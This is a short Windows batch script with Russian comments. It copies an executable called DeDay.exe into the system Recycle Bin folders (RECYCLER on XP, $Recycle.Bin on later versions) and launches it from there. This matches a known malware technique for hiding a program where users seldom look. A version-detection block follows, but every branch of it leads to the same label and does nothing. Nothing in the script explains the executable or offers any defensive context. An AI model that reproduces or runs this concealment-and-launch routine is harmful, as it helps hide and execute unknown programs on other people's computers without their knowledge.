@echo off

::xp
xcopy DeDay.exe %SystemDrive%\RECYCLER\ /Y
::w7 
xcopy DeDay.exe %SystemDrive%\$Recycle.Bin\ /Y

::корзина в хп 
%SystemDrive%\RECYCLER\DeDay.exe
::win 7 корзина в 10 $Recycle.Bin
%SystemDrive%\$Recycle.Bin\DeDay.exe

Echo Off
For /F "Tokens=2 Delims=[]" %%i In ('ver') Do (
   For /F "Tokens=2,3 Delims=. " %%a In ("%%i") Do Set version=%%a.%%b
)

If "%version%"=="4.0" GoTo NT
If "%version%"=="95" GoTo W95
If "%version%"=="98" GoTo W98
If "%version%"=="ME" GoTo ME
If "%version%"=="5.0" GoTo W2000
If "%version%"=="5.1" GoTo XP
If "%version%"=="5.2" GoTo W2003
If "%version%"=="6.0" GoTo Vista
IF "%version%"=="6.1" GoTo W7_2008
If "%version%"=="6.2" GoTo W8_2012
GoTo Continue

:NT
GoTo Continue

:W95
GoTo Continue

:W98
GoTo Continue

:ME
GoTo Continue

:W2000
GoTo Continue

:XP
GoTo Continue

:W2003
GoTo Continue

:Vista

GoTo Continue

:W7_2008

GoTo Continue

:W8_2012

GoTo Continue

:Continue
pause
exit

